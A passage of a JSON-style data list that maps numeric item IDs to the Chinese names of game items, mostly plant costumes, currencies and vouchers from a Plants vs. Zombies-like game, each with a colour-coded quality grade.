{"42001641":"金蝉花敦煌装扮碎片","pinzhi":"chengse"},
{"42001651":"藕花白龙单镜片装扮碎片","pinzhi":"chengse"},
{"30010011":"豌豆射手春节装扮","pinzhi":"baise"},
{"30010012":"豌豆射手圣诞装扮","pinzhi":"baise"},
{"30010013":"豌豆射手飞车装扮","pinzhi":"baise"},
{"30010021":"向日葵海盗船长装扮","pinzhi":"baise"},
{"30010022":"向日葵六一装扮","pinzhi":"baise"},
{"30010023":"向日葵万圣装扮","pinzhi":"baise"},
{"30010024":"向日葵圣诞节装扮","pinzhi":"baise"},
{"30010025":"向日葵联动装扮","pinzhi":"baise"},
{"30010031":"坚果大胡子装扮","pinzhi":"baise"},
{"30010032":"坚果绷带装扮","pinzhi":"baise"},
{"30010033":"坚果三脚机械装扮","pinzhi":"baise"},
{"30010041":"土豆海绵眼睛装扮","pinzhi":"baise"},
{"30010042":"土豆虎年鞭炮装扮","pinzhi":"baise"},
{"30010053":"卷心菜投手春节装扮","pinzhi":"baise"},
{"30010054":"卷心菜投手头饰装扮","pinzhi":"baise"},
{"30010061":"冰冻生菜复古耳罩","pinzhi":"baise"},
{"30010062":"冰冻生菜豌豆耳罩","pinzhi":"baise"},
{"30010071":"回旋镖射手彩蛋帽装扮","pinzhi":"lvse"},
{"30010072":"回旋镖射手飞侠","pinzhi":"lvse"},
{"30010081":"双胞向日葵礼帽装扮","pinzhi":"lanse"},
{"30010082":"双胞向日葵超级装扮","pinzhi":"lanse"},
{"30010083":"双胞向日葵炫彩装扮","pinzhi":"lanse"},
{"30010091":"菜问春节衣服","pinzhi":"lanse"},
{"30010092":"菜问牛年帽子","pinzhi":"lanse"},
{"30010093":"菜问万圣绷带装扮","pinzhi":"lanse"},
{"30010094":"菜问全息装扮","pinzhi":"lanse"},
{"30010101":"弹簧豆草裙","pinzhi":"baise"},
{"30010121":"火龙草钢盔","pinzhi":"chengse"},
{"30010122":"火龙草礼帽装扮","pinzhi":"chengse"},
{"30010123":"火龙草兔耳帽装扮","pinzhi":"chengse"},
{"30010124":"火龙草龙年装扮","pinzhi":"chengse"},
{"30010125":"火龙草海盗帽装扮","pinzhi":"chengse"},
{"30010131":"能量花周年装扮","pinzhi":"lanse"},
{"30010141":"窝瓜头带二装扮","pinzhi":"lanse"},
{"30010142":"窝瓜飞车装扮","pinzhi":"lanse"},
{"30010151":"巴豆围巾装扮","pinzhi":"baise"},
{"30010161":"双向射手圣与魔头饰","pinzhi":"baise"},
{"30010162":"双向射手小红帽装扮","pinzhi":"baise"},
{"30010181":"噬碑藤怀旧装扮","pinzhi":"baise"},
{"30010191":"寒冰射手绿色绒线帽装扮","pinzhi":"lvse"},
{"30010192":"寒冰射手棉帽装扮","pinzhi":"lvse"},
{"30010193":"寒冰射手永劫无间侠帽装扮","pinzhi":"lvse"},
{"30010201":"火炬树桩蓝色泳镜","pinzhi":"lvse"},
{"30010211":"玉米投手加油头带","pinzhi":"baise"},
{"30010213":"玉米投手绅士衣服","pinzhi":"baise"},
{"30010221":"闪电芦苇兔耳帽装扮","pinzhi":"lvse"},
{"30010222":"闪电芦苇绅士礼帽装扮","pinzhi":"lvse"},
{"30010231":"椰子加农炮复古帽装扮","pinzhi":"zise"},
{"30010232":"椰子加农炮礼帽装扮","pinzhi":"zise"},
{"30010241":"西瓜投手水手帽装扮","pinzhi":"lvse"},
{"30010242":"西瓜投手礼帽装扮","pinzhi":"lvse"},
{"30010244":"西瓜投手盒子帽装扮","pinzhi":"lvse"},
{"30010251":"豌豆荚3D眼镜装扮","pinzhi":"lvse"},
{"30010252":"豌豆荚毛绒帽装扮","pinzhi":"lvse"},
{"30010271":"双重射手维京帽装扮","pinzhi":"lanse"},
{"30010273":"双重射手棉帽装扮","pinzhi":"lanse"},
{"30010274":"双重射手马头帽装扮","pinzhi":"lanse"},
{"30010281":"钢地刺护目镜","pinzhi":"lvse"},
{"30010282":"钢地刺单片镜","pinzhi":"lvse"},
{"30010291":"高坚果学者装扮","pinzhi":"lvse"},
{"30010292":"高坚果六一装扮","pinzhi":"lvse"},
{"30010301":"三重射手铁锅装扮","pinzhi":"lvse"},
{"30010302":"三重射手六一装扮","pinzhi":"lvse"},
{"30010311":"冰西瓜绒帽装扮","pinzhi":"chengse"},
{"30010313":"冰西瓜夹子风扇","pinzhi":"chengse"},
{"30010331":"仙桃永劫无间头饰","pinzhi":"baise"},
{"30010372":"棱镜草礼帽装扮","pinzhi":"lvse"},
{"30010373":"棱镜草儿童节日礼帽装扮","pinzhi":"lvse"},
{"30010391":"激光豆金链","pinzhi":"lanse"},
{"30010392":"激光豆六一装扮","pinzhi":"lanse"},
{"30010393":"激光豆周年装扮","pinzhi":"lanse"},
{"30010394":"激光豆超级装扮","pinzhi":"lanse"},
{"30010401":"星星果假发","pinzhi":"lanse"},
{"30010421":"脉冲黄桃万圣装扮","pinzhi":"lvse"},
{"30010431":"充能柚子冰杯帽装扮","pinzhi":"chengse"},
{"30010441":"全息坚果面包机装扮","pinzhi":"lanse"},
{"30010442":"全息坚果周年装扮","pinzhi":"lanse"},
{"30010451":"瓷砖萝卜超级装扮","pinzhi":"chengse"},
{"30010491":"小喷菇周年庆装扮","pinzhi":"baise"},
{"30010501":"大喷菇舞狮头装扮","pinzhi":"baise"},
{"30010502":"大喷菇麋鹿装扮","pinzhi":"baise"},
{"30010511":"魅惑菇头饰装扮","pinzhi":"baise"},
{"30010521":"阳光菇唐僧帽子装扮","pinzhi":"chengse"},
{"30010522":"阳光菇兔耳装扮","pinzhi":"chengse"},
{"30010541":"花生射手三位一体装扮","pinzhi":"baise"},
{"30010551":"磁力菇棋盘格装扮","pinzhi":"baise"},
{"30010581":"寒冰菇金秋装扮","pinzhi":"chengse"},
{"30010611":"蒲公英蝴蝶结装扮","pinzhi":"zise"},
{"30010641":"荷叶青蛙装扮","pinzhi":"baise"},
{"30010651":"保龄泡泡红鼻子装扮","pinzhi":"chengse"},
{"30010691":"导向蓟六一装扮","pinzhi":"lanse"},
{"30010692":"导向蓟周年庆装扮","pinzhi":"lanse"},
{"30010701":"大嘴花春节装扮","pinzhi":"lanse"},
{"30010702":"大嘴花周年装扮","pinzhi":"lanse"},
{"30010703":"大嘴花超级装扮","pinzhi":"lanse"},
{"30010711":"强酸柠檬圣诞装扮","pinzhi":"chengse"},
{"30010721":"幽灵辣椒灯笼装扮","pinzhi":"zise"},
{"30010781":"火焰豌豆周年装扮","pinzhi":"lvse"},
{"30010782":"火焰豌豆墨镜装扮","pinzhi":"lvse"},
{"30010811":"甜菜护卫腰带","pinzhi":"zise"},
{"30010812":"甜菜护卫虎年装扮","pinzhi":"zise"},
{"30010821":"眩晕洋葱飞行套装扮","pinzhi":"lvse"},
{"30010831":"旋转芜菁望远镜头带","pinzhi":"lvse"},
{"30010861":"板栗小队六一装扮","pinzhi":"lanse"},
{"30010911":"芦笋战机莫西干装扮","pinzhi":"lanse"},
{"30010931":"蚕豆突击队六一装扮","pinzhi":"zise"},
{"30010932":"蚕豆突击队飞车装扮","pinzhi":"zise"},
{"30010933":"蚕豆突击队海盗旗装扮","pinzhi":"zise"},
{"30010981":"玫瑰剑客头盔装扮","pinzhi":"lanse"},
{"30010991":"电击蓝莓三孔插座帽装扮","pinzhi":"zise"},
{"30010992":"电击蓝莓学士帽装扮","pinzhi":"zise"},
{"31110011":"捣蛋萝卜六一装扮","pinzhi":"lanse"},
{"31110021":"向日葵歌手虎年装扮","pinzhi":"zise"},
{"31110022":"向日葵歌手六一装扮","pinzhi":"zise"},
{"31110023":"向日葵歌手奥运装扮","pinzhi":"zise"},
{"31110024":"向日葵歌手超级装扮","pinzhi":"zise"},
{"31110031":"榴莲球衣","pinzhi":"lvse"},
{"31110041":"南瓜巫师万圣装扮","pinzhi":"lanse"},
{"31110042":"南瓜巫师姜饼人装扮","pinzhi":"lanse"},
{"31110081":"阿开木木头带","pinzhi":"lanse"},
{"31110091":"红针花探险帽装扮","pinzhi":"lanse"},
{"31110101":"大丽菊面具","pinzhi":"baise"},
{"31110111":"岩浆番石榴花圈","pinzhi":"lanse"},
{"31110121":"金蟾菇爆炸头装扮","pinzhi":"lanse"},
{"31110131":"棉小雪洋帽装扮","pinzhi":"lanse"},
{"31110141":"菠萝蜜六一装扮","pinzhi":"lvse"},
{"31110142":"菠萝蜜搞怪眼罩装扮","pinzhi":"lvse"},
{"31110151":"龙舌兰春节装扮","pinzhi":"lanse"},
{"31110152":"龙舌兰礼帽装扮","pinzhi":"lanse"},
{"31110161":"猕猴桃气球金箍","pinzhi":"zise"},
{"31110162":"猕猴桃围巾装扮","pinzhi":"zise"},
{"31110163":"猕猴桃全身装扮","pinzhi":"zise"},
{"31110164":"猕猴桃超级装扮","pinzhi":"zise"},
{"31110171":"梅小美古风装扮","pinzhi":"lanse"},
{"31110172":"梅小美面纱装扮","pinzhi":"lanse"},
{"31110191":"天使星星果眼镜装扮","pinzhi":"chengse"},
{"31110192":"天使星星果全身装扮","pinzhi":"chengse"},
{"31110193":"天使星星果超级装扮","pinzhi":"chengse"},
{"31110201":"火柴花拳手斗篷装扮","pinzhi":"zise"},
{"31110211":"火焰花女王芭蕉扇装扮","pinzhi":"chengse"},
{"31110221":"机枪豌豆联动装扮","pinzhi":"chengse"},
{"31110222":"机枪豌豆限定装扮","pinzhi":"chengse"},
{"31110223":"机枪豌豆耳机装扮","pinzhi":"chengse"},
{"31110224":"机枪豌豆超级装扮","pinzhi":"chengse"},
{"31110231":"魔音甜菜兔年DJ围巾装扮","pinzhi":"lanse"},
{"31110251":"潜伏芹菜斗士盔","pinzhi":"lanse"},
{"31110261":"孢子菇蓝色折纸帽装扮","pinzhi":"lanse"},
{"31110271":"大蒜硅胶手套","pinzhi":"lvse"},
{"31110272":"大蒜宠物装扮","pinzhi":"lvse"},
{"31110291":"仙人掌派对助力装扮","pinzhi":"chengse"},
{"31110292":"仙人掌超级装扮","pinzhi":"chengse"},
{"31110293":"仙人掌敦煌装扮","pinzhi":"chengse"},
{"31110301":"猫尾草小型快递纸箱装扮","pinzhi":"chengse"},
{"31110302":"猫尾草蛋糕头装扮","pinzhi":"chengse"},
{"31110303":"猫尾草宠物装扮","pinzhi":"chengse"},
{"31110321":"爆裂葡萄彩气球","pinzhi":"chengse"},
{"31110322":"爆裂葡萄敦煌装扮","pinzhi":"chengse"},
{"31110331":"冰龙草冰激凌装扮","pinzhi":"chengse"},
{"31110332":"冰龙草龙年装扮","pinzhi":"chengse"},
{"31110333":"冰龙草全身装扮","pinzhi":"chengse"},
{"31110351":"原始豌豆射手浴帽装扮","pinzhi":"lanse"},
{"31110352":"原始豌豆射手春节装扮","pinzhi":"lanse"},
{"31110353":"原始豌豆射手河姆渡头罐","pinzhi":"lanse"},
{"31110354":"原始豌豆锦衣卫全身装扮","pinzhi":"lanse"},
{"31110361":"原始坚果墙泳装扮","pinzhi":"lanse"},
{"31110362":"原始坚果墙蜜帝全身装扮","pinzhi":"lanse"},
{"31110381":"原始向日葵恐龙帽装扮","pinzhi":"lanse"},
{"31110382":"原始向日葵河姆渡陶罐装扮","pinzhi":"lanse"},
{"31110383":"原始向日葵敦煌装扮","pinzhi":"lanse"},
{"31110391":"原始土豆地雷虎纹装扮","pinzhi":"zise"},
{"31110392":"原始土豆地雷雷区牌装扮","pinzhi":"zise"},
{"31110401":"龙吼草联动装扮","pinzhi":"zise"},
{"31110431":"蔗师傅联动装扮","pinzhi":"chengse"},
{"31110441":"玉米加农炮圣诞帽装扮","pinzhi":"chengse"},
{"31110442":"玉米加农炮超级装扮","pinzhi":"chengse"},
{"31110451":"苹果迫击炮虎年装扮","pinzhi":"chengse"},
{"31110452":"苹果迫击炮成长装扮","pinzhi":"chengse"},
{"31110453":"苹果迫击炮派对助力装扮","pinzhi":"chengse"},
{"31110454":"苹果迫击炮恶魔超级装扮","pinzhi":"chengse"},
{"31110461":"金缕梅女巫睡帽装扮","pinzhi":"chengse"},
{"31110462":"金缕梅女巫美人鱼装扮","pinzhi":"chengse"},
{"31110471":"逃脱树根警长帽装扮","pinzhi":"chengse"},
{"31110472":"逃脱树根全息眼镜装扮","pinzhi":"chengse"},
{"31110481":"电流醋栗节能灯装扮","pinzhi":"chengse"},
{"31110482":"电流醋栗电流示警装扮","pinzhi":"chengse"},
{"31110501":"超能花菜敦煌装扮","pinzhi":"chengse"},
{"31110521":"月光花周年庆装扮","pinzhi":"lvse"},
{"31110531":"爆炸坚果星星眼镜装扮","pinzhi":"lvse"},
{"31110551":"幽暮投手鸭舌帽装扮","pinzhi":"chengse"},
{"31110561":"铃儿草投手蝴蝶结装扮","pinzhi":"lanse"},
{"31110611":"防风草蟹壳帽装扮","pinzhi":"chengse"},
{"31110621":"槲寄冰仙子围巾装扮","pinzhi":"zise"},
{"31110622":"槲寄冰仙子周年装扮","pinzhi":"zise"},
{"31110623":"槲寄冰仙子全身装扮","pinzhi":"zise"},
{"31110641":"黄金蓓蕾周年装扮","pinzhi":"baise"},
{"31110642":"黄金蓓蕾拉拉队装扮","pinzhi":"baise"},
{"31110671":"芦黎药师成长装扮","pinzhi":"chengse"},
{"31110672":"芦黎药师超级装扮","pinzhi":"chengse"},
{"31110691":"吹风荚兰儿童高筒帽装扮","pinzhi":"zise"},
{"31110631":"野兽猕猴桃头饰","pinzhi":"zise"},
{"31110632":"野兽猕猴桃猪八戒装扮","pinzhi":"zise"},
{"31110701":"桑葚爆破手周年庆假面装扮","pinzhi":"chengse"},
{"31110702":"桑葚爆破手成长海盗眼罩","pinzhi":"chengse"},
{"31110703":"桑葚爆破手限时召唤海盗装扮","pinzhi":"chengse"},
{"31110704":"桑葚爆破手超级装扮","pinzhi":"chengse"},
{"31110711":"电能豌豆成长装扮","pinzhi":"chengse"},
{"31110712":"电能豌豆耳机装扮","pinzhi":"chengse"},
{"31110721":"寒冰醋栗护目镜装扮","pinzhi":"chengse"},
{"31110751":"茄子忍者圣诞装扮","pinzhi":"chengse"},
{"31110752":"茄子忍者成长装扮","pinzhi":"chengse"},
{"31110753":"茄子忍者零装扮","pinzhi":"chengse"},
{"31110791":"双枪松果兔年装扮","pinzhi":"chengse"},
{"31110821":"冬青骑士福字装扮","pinzhi":"chengse"},
{"31110841":"暗影豌豆女巫帽装扮","pinzhi":"zise"},
{"31110842":"暗影豌豆草帽装扮","pinzhi":"zise"},
{"31110851":"食人花豌豆成长装扮","pinzhi":"chengse"},
{"31110852":"食人花豌豆围巾装扮","pinzhi":"chengse"},
{"31110861":"水晶兰圣诞装扮","pinzhi":"zise"},
{"31110862":"水晶兰唐僧装扮","pinzhi":"zise"},
{"31110871":"豌豆迫击炮周年庆装扮","pinzhi":"zise"},
{"31110872":"豌豆迫击炮金秋装扮","pinzhi":"zise"},
{"31110881":"雷龙草兔年装扮","pinzhi":"chengse"},
{"31110882":"雷龙草龙年装扮","pinzhi":"chengse"},
{"31110891":"芦荟医师战旗套装扮","pinzhi":"zise"},
{"31110892":"芦荟医师周年装扮","pinzhi":"zise"},
{"31110893":"芦荟医师全身装扮","pinzhi":"zise"},
{"31110894":"芦荟医师财运亨通装扮","pinzhi":"zise"},
{"31110895":"芦荟医师财运亨通幻彩装扮","pinzhi":"zise"},
{"31110901":"熊果臼炮周年庆装扮","pinzhi":"chengse"},
{"31110902":"熊果臼炮成长装扮","pinzhi":"chengse"},
{"31110903":"熊果臼炮沙僧装扮","pinzhi":"chengse"},
{"32000011":"小黄梨兔年装扮","pinzhi":"zise"},
{"32000012":"小黄梨禅杖装扮","pinzhi":"zise"},
{"32000061":"毒液豌豆射手巫医装扮","pinzhi":"chengse"},
{"32000062":"毒液豌豆射手潮流小帽装扮","pinzhi":"chengse"},
{"32000071":"杜英投手六一装扮","pinzhi":"zise"},
{"32000072":"杜英投手周年装扮","pinzhi":"zise"},
{"32000073":"杜英投手永劫无间装扮","pinzhi":"zise"},
{"32000091":"荸荠兄弟虎年装扮","pinzhi":"chengse"},
{"32000092":"荸荠兄弟成长装扮","pinzhi":"chengse"},
{"32000093":"荸荠兄弟金银大王装扮","pinzhi":"chengse"},
{"32000101":"尖刺秋葵娃娃假发装扮","pinzhi":"chengse"},
{"32000102":"尖刺秋葵大冬被装扮","pinzhi":"chengse"},
{"32000111":"铜钱草鼓手兔年装扮","pinzhi":"zise"},
{"32000112":"铜钱草鼓手领带装扮","pinzhi":"zise"},
{"32000131":"潜行开口剑围巾装扮","pinzhi":"zise"},
{"32000171":"滴水冰莲联动装扮","pinzhi":"baise"},
{"32000191":"厨师杓兰六一装扮","pinzhi":"chengse"},
{"32000192":"厨师杓兰成长装扮","pinzhi":"chengse"},
{"32000211":"橄榄坑成长装扮","pinzhi":"chengse"},
{"32000212":"橄榄坑搞怪眼镜装扮","pinzhi":"chengse"},
{"32000241":"地星发射井金秋装扮","pinzhi":"chengse"},
{"32000251":"奶油生菜宠物装扮","pinzhi":"chengse"},
{"32000261":"眩晕雏菊眩晕眼镜装扮","pinzhi":"chengse"},
{"32000271":"爆炸桔梗圣诞节装扮","pinzhi":"zise"},
{"32000321":"火鸡投手圣诞节装扮","pinzhi":"chengse"},
{"32000322":"火鸡投手奶嘴装扮","pinzhi":"chengse"},
{"32000341":"聚能山竹发卡装扮","pinzhi":"chengse"},
{"32000342":"聚能山竹飞车装扮","pinzhi":"chengse"},
{"32000343":"聚能山竹全身装扮","pinzhi":"chengse"},
{"32000344":"聚能山竹超级装扮","pinzhi":"chengse"},
{"32000371":"烈焰火蕨舞会假面装扮","pinzhi":"chengse"},
{"32000372":"烈焰火蕨哪吒全身装扮","pinzhi":"chengse"},
{"32000381":"虎头菇成长装扮","pinzhi":"chengse"},
{"32000382":"虎头菇永劫无间联动装扮","pinzhi":"chengse"},
{"32000391":"气流水仙花成长装扮","pinzhi":"zise"},
{"32000392":"气流水仙花灯笼装扮","pinzhi":"zise"},
{"32000411":"地锯草耳机装扮","pinzhi":"chengse"},
{"32000511":"激光皇冠花圣诞大胡子装扮","pinzhi":"chengse"},
{"32000512":"激光皇冠花成长装扮","pinzhi":"chengse"},
{"32000513":"激光皇冠花女王装扮","pinzhi":"chengse"},
{"32000531":"扇贝兰成长装扮","pinzhi":"chengse"},
{"32000532":"扇贝兰派对助力装扮","pinzhi":"chengse"},
{"32000561":"双生卯兔成长装扮","pinzhi":"chengse"},
{"32000571":"长枪秋兰龙年装扮","pinzhi":"chengse"},
{"32000572":"长枪秋兰红孩儿装扮","pinzhi":"chengse"},
{"32000581":"牛蒡击球手成长装扮","pinzhi":"chengse"},
{"32000582":"牛蒡击球手全身装扮","pinzhi":"chengse"},
{"32000583":"牛蒡击球手牛魔王装扮","pinzhi":"chengse"},
{"32000601":"南瓜头全身装扮","pinzhi":"lanse"},
{"32000611":"鹳草击剑手龙年装扮","pinzhi":"chengse"},
{"32000621":"蓄电雪松果成长装扮","pinzhi":"chengse"},
{"32000641":"蛇妖瓶子草成长装扮","pinzhi":"chengse"},
{"32000642":"蛇妖瓶子草墨镜装扮","pinzhi":"chengse"},
{"32000661":"曼德拉草成长装扮","pinzhi":"chengse"},
{"32000662":"曼德拉草派对助力装扮","pinzhi":"chengse"},
{"32000671":"深渊海葵成长装扮","pinzhi":"chengse"},
{"32000681":"深渊魔爪花成长装扮","pinzhi":"chengse"},
{"32000691":"粉丝心叶兰圣诞装扮","pinzhi":"chengse"},
{"32000692":"粉丝心叶兰飞车装扮","pinzhi":"chengse"},
{"32000721":"蜜蜂铃兰尖头帽装扮","pinzhi":"chengse"},
{"32000731":"剑叶龙血树成长装扮","pinzhi":"chengse"},
{"32000732":"剑叶龙血树永劫无间联动装扮","pinzhi":"chengse"},
{"32000733":"剑叶龙血树红衣服装扮","pinzhi":"chengse"},
{"32000741":"斯巴达竹成长装扮","pinzhi":"chengse"},
{"32000771":"暗夜菇成长装扮","pinzhi":"chengse"},
{"32000772":"暗夜菇卷轴装扮","pinzhi":"chengse"},
{"32000791":"贪吃龙草成长装扮","pinzhi":"chengse"},
{"32000792":"贪吃龙草超级装扮","pinzhi":"chengse"},
{"32000793":"贪吃龙草龙王装扮","pinzhi":"chengse"},
{"32000801":"兔极企鹅装扮","pinzhi":"chengse"},
{"32000821":"蝎尾蕉机枪手成长装扮","pinzhi":"chengse"},
{"32000822":"蝎尾蕉机枪手饿哥装扮","pinzhi":"chengse"},
{"32000831":"电鳗香蕉派对助力装扮","pinzhi":"chengse"},
{"32000832":"电鳗香蕉超级装扮","pinzhi":"chengse"},
{"32000841":"荆棘巫师成长装扮","pinzhi":"chengse"},
{"32000851":"锯齿锦地罗成长装扮","pinzhi":"chengse"},
{"32000861":"寄生仙钗成长装扮","pinzhi":"chengse"},
{"32000881":"暴君火龙果成长装扮","pinzhi":"chengse"},
{"32000911":"电击鹰爪花飞车装扮","pinzhi":"chengse"},
{"32000912":"电击鹰爪花电池头装扮","pinzhi":"chengse"},
{"32000921":"留声曼陀罗金秋装扮","pinzhi":"chengse"},
{"32000922":"留声曼陀罗成长装扮","pinzhi":"chengse"},
{"32000923":"留声曼陀罗音响装扮","pinzhi":"chengse"},
{"32000941":"日月金银花冬日装扮","pinzhi":"chengse"},
{"32000942":"日月金银花吃饭家伙装扮","pinzhi":"chengse"},
{"32000951":"蛮族大黄成长装扮","pinzhi":"chengse"},
{"32000971":"寒霜白毛丹成长装扮","pinzhi":"chengse"},
{"32000972":"寒霜白毛丹大肥龙装扮","pinzhi":"chengse"},
{"32000981":"电击钩吻派对助力眼镜装扮","pinzhi":"chengse"},
{"32000982":"电击钩吻成长装扮","pinzhi":"chengse"},
{"32000983":"电击钩吻幻彩装扮","pinzhi":"chengse"},
{"32000984":"电击钩吻幻彩后装扮","pinzhi":"chengse"},
{"32000991":"寒冰地刺头饰装扮","pinzhi":"chengse"},
{"32000992":"寒冰地刺围巾装扮","pinzhi":"chengse"},
{"32001001":"珊瑚泡泡姬成长装扮","pinzhi":"chengse"},
{"32001002":"珊瑚泡泡姬标签装扮","pinzhi":"chengse"},
{"32001003":"珊瑚泡泡姬全身装扮","pinzhi":"chengse"},
{"32001011":"百宝兜兰丞相帽子装扮","pinzhi":"chengse"},
{"32001012":"百宝兜兰大胡子装扮","pinzhi":"chengse"},
{"32001021":"女娲蛇尾草全身装扮","pinzhi":"chengse"},
{"32001022":"女娲蛇尾草头饰装扮","pinzhi":"chengse"},
{"32001271":"枫影刺客双刀流装扮","pinzhi":"chengse"},
{"32001272":"枫影刺客头箍装扮","pinzhi":"chengse"},
{"32001273":"枫影刺客装逼眼镜装扮","pinzhi":"chengse"},
{"32001281":"守卫菇全身装扮","pinzhi":"chengse"},
{"32001282":"守卫菇圣诞树装扮","pinzhi":"chengse"},
{"32001282":"守卫菇猎魔牛仔超级装扮","pinzhi":"chengse"},
{"32001331":"伏僵塔黄全身装扮","pinzhi":"chengse"},
{"32001332":"伏僵塔黄超级装扮","pinzhi":"chengse"},
{"32001341":"超级机枪射手全身装扮","pinzhi":"chengse"},
{"32001342":"超级机枪射手超级装扮","pinzhi":"chengse"},
{"32001351":"海带守卫金链子腕表装扮","pinzhi":"zise"},
{"32001361":"海蘑菇草帽装扮","pinzhi":"lanse"},
{"32001371":"噗噗鱼藤睡帽装扮","pinzhi":"lvse"},
{"32001372":"噗噗鱼藤耳机装扮","pinzhi":"lvse"},
{"32001381":"氧气藻白翅膀装扮","pinzhi":"baise"},
{"32001382":"氧气藻氧气面罩装扮","pinzhi":"baise"},
{"32001391":"海神草全身装扮","pinzhi":"chengse"},
{"32001392":"海神草金丝眼镜装扮","pinzhi":"chengse"},
{"32001401":"海豌豆兔耳帽装扮","pinzhi":"chengse"},
{"32001402":"海豌豆鸭嘴兽全身装扮","pinzhi":"chengse"},
{"32001421":"盒子草礼炮太阳伞装扮","pinzhi":"zise"},
{"32001431":"球果训练家全身装扮","pinzhi":"chengse"},
{"32001432":"球果训练家绣球装扮","pinzhi":"chengse"},
{"32001433":"球果训练家森林之子超级装扮","pinzhi":"chengse"},
{"32001571":"胆小菇青帽子装扮","pinzhi":"zise"},
{"32001581":"黑法师光环装扮","pinzhi":"chengse"},
{"32001582":"黑法师魔法书装扮","pinzhi":"chengse"},
{"32001591":"太极木槿战装装扮","pinzhi":"chengse"},
{"32001592":"太极木槿女仆装扮","pinzhi":"chengse"},
{"32001611":"毁灭菇博士装扮","pinzhi":"chengse"},
{"32001612":"毁灭菇勇武将军装扮","pinzhi":"chengse"},
{"32001631":"鸭梨椰子壳装扮","pinzhi":"chengse"},
{"32001632":"鸭梨胖蜜蜂装扮","pinzhi":"chengse"},
{"32001641":"金蝉花敦煌装扮","pinzhi":"chengse"},
{"32001651":"藕花白龙单镜片装扮","pinzhi":"chengse"},
{"23007":"白色培养液","pinzhi":"baise"},
{"23008":"绿色培养液","pinzhi":"lvse"},
{"23009":"蓝色培养液","pinzhi":"lanse"},
{"23010":"紫色培养液","pinzhi":"zise"},
{"23011":"橙色培养液","pinzhi":"chengse"},
{"23028":"超Z币","pinzhi":"chengse"},
{"23036":"紫金币","pinzhi":"zise"},
{"23037":"限时夺宝奖杯","pinzhi":"chengse"},
{"23046":"进阶书","pinzhi":"chengse"},
{"23091":"大剧院币","pinzhi":"lanse"},
{"23093":"追击币","pinzhi":"lvse"},
{"23094":"时空水晶","pinzhi":"lanse"},
{"23095":"时空粉尘","pinzhi":"zise"},
{"23097":"红水晶","pinzhi":"hongse"},
{"23098":"秘宝券","pinzhi":"chengse"},
{"23111":"心愿抽奖券","pinzhi":"chengse"},
{"23112":"时空能量罐","pinzhi":"lanse"},
{"23113":"时空立方","pinzhi":"zise"},
{"23114":"时空能量罐","pinzhi":"lanse"},
{"23115":"时空能量罐","pinzhi":"lanse"},
{"23116":"时空立方","pinzhi":"zise"},
{"23117":"时空立方","pinzhi":"zise"},
{"23123":"普通神器祝福券","pinzhi":"lanse"},
{"23124":"高级神器祝福券","pinzhi":"chengse"},
{"23140":"基因源质","pinzhi":"lvse"},
{"23141":"基因币","pinzhi":"lvse"},
{"23225":"万能碎片","pinzhi":"chengse"},
{"23226":"定向碎片","pinzhi":"zise"},
{"23238":"嘉年华兑换券","pinzhi":"chengse"},
{"23243":"双人对决紫币","pinzhi":"zise"},
{"23285":"聚宝盆兑换币","pinzhi":"lvse"},
{"23289":"装扮券","pinzhi":"fense"},
{"23306":"聚宝盆金币","pinzhi":"chengse"},
{"23361":"龙晶","pinzhi":"chengse"},
{"23362":"龙族宝库积分","pinzhi":"chengse"},
{"23365":"绿色植物两片自选","pinzhi":"lvse"},
{"23367":"绿色植物三片自选","pinzhi":"lvse"},
{"23369":"蓝色植物两片自选","pinzhi":"lanse"},
{"23371":"蓝色植物三片自选","pinzhi":"lanse"},
{"23373":"紫色植物两片自选","pinzhi":"zise"},
{"23375":"紫色植物三片自选","pinzhi":"zise"},
{"23379":"蓝色自选","pinzhi":"lanse"},
{"23381":"紫色自选","pinzhi":"zise"},
{"23383":"橙色自选","pinzhi":"chengse"},
{"23385":"花盆自选","pinzhi":"baise"},
{"23387":"超级自选","pinzhi":"baise"},
{"23394":"雕像","pinzhi":"baise"},
{"23395":"幸运宝箱2期","pinzhi":"chengse"},
{"23396":"僵博蓝水晶","pinzhi":"lanse"},
{"23397":"许愿池币","pinzhi":"lanse"},
{"23398":"邀新邀请券","pinzhi":"lvse"},
{"23399":"鞭炮","pinzhi":"hongse"},
{"23400":"黄色蜗牛币","pinzhi":"huangse"},
{"23401":"彩色蜗牛币","pinzhi":"zise"},
{"23402":"庭院黄币","pinzhi":"huangse"},
{"23403":"庭院紫币","pinzhi":"zise"},
{"3008":"钻石","pinzhi":"lanse"},
{"4013":"金币","pinzhi":"huangse"},
{"2209":"黄瓜","pinzhi":"lvse"},
{"3010":"戴夫券","pinzhi":"huangse"},
{"300067":"海螺","pinzhi":"zise"},
{"300060":"邀新邀请券","pinzhi":"lvse"},
{"300001":"水壶","pinzhi":"chengse"},
{"300030":"战令券","pinzhi":"huangse"},
{"300009":"戴夫厨房玉米","pinzhi":"huangse"},
{"300010":"戴夫厨房水","pinzhi":"lanse"},
{"300011":"戴夫厨房蔬","pinzhi":"lvse"},
{"300012":"戴夫厨房牛肉","pinzhi":"hongse"},
{"300018":"42号秘境黄币","pinzhi":"huangse"},
{"300019":"42号秘境彩色币","pinzhi":"fense"},
{"300020":"强化阳光","pinzhi":"huangse"},
{"300021":"强化阳光","pinzhi":"huangse"},
{"300022":"派对助力券","pinzhi":"chengse"},
{"300041":"龙族宝库龙晶","pinzhi":"fense"},
{"300042":"龙族宝库积分","pinzhi":"chengse"},
{"300045":"秘宝钥","pinzhi":"chengse"},
{"300046":"凌霄币","pinzhi":"chengse"},
{"300061":"至臻宝箱","pinzhi":"lanse"},
{"300062":"海神宝箱","pinzhi":"chengse"},
{"300063":"海神代币","pinzhi":"huangse"},
{"300074":"寻宝券","pinzhi":"chengse"},
{"300080":"许愿币","pinzhi":"lanse"},
{"300082":"齿轮","pinzhi":"baise"},
{"300083":"棕黑种子","pinzhi":"huangse"},
{"300084":"橙黄种子","pinzhi":"chengse"},
{"300085":"绿色种子","pinzhi":"lvse"},
{"300086":"绿色种子","pinzhi":"lvse"},
{"300087":"橙黄种子","pinzhi":"chengse"},
{"300088":"化肥","pinzhi":"huangse"},
{"300089":"普通花盆","pinzhi":"baise"},
{"300090":"特殊花盆","pinzhi":"huangse"},
{"300093":"农场金币","pinzhi":"chengse"},
{"300094":"超级玉米","pinzhi":"huangse"},
{"300095":"强化能量","pinzhi":"lanse"},
{"300096":"僵博蓝水晶","pinzhi":"lanse"},
{"300097":"25.10月同游币","pinzhi":"huangse"},
{"300098":"潘妮金","pinzhi":"chengse"},
{"300099":"废土币","pinzhi":"chengse"},
{"300100":"毒液晶石","pinzhi":"lvse"},
